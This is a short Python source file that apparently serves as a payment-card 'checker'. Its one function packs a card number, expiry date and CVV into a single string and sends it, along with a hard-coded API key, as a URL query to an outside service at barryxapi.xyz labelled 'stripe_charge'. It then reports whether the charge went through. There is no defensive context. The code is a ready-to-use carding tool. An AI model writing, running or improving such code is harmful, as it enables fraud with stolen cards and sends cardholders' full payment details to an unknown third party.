import requests

def auth_func(_, cc, cvv, mes, ano):
    session = requests.Session()
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        url = "https://barryxapi.xyz/stripe_charge"
        key = "BRY-FGKD5-MDYRI-56HDM"
        response = session.get(f"{url}?key={key}&card={fullcc}", timeout=25)

        if response.status_code == 200:
            data = response.json()
            result = data.get("result", {})
            status = result.get("status", "❓")
            msg = result.get("message", "No message")
            return {"status": status, "response": msg}
        else:
            return {"status": "Error", "response": f"HTTP {response.status_code}"}

    except Exception as e:
        return {"status": "Error", "response": str(e)}
